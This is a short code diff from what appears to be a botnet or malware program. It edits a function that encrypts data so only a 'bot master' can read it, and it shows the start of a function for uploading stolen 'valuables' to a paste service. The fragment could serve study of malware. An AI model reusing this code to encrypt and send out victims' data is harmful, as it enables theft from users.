@@ -21,7 +21,6 @@ def encrypt_for_master(data):
     cipher = PKCS1_v1_5.new(key)
     ciphertext = cipher.encrypt(data+h.digest())
     return ciphertext
-    return data
 
 def upload_valuables_to_pastebot(fn):
     # Encrypt the valuables so only the bot master can read them
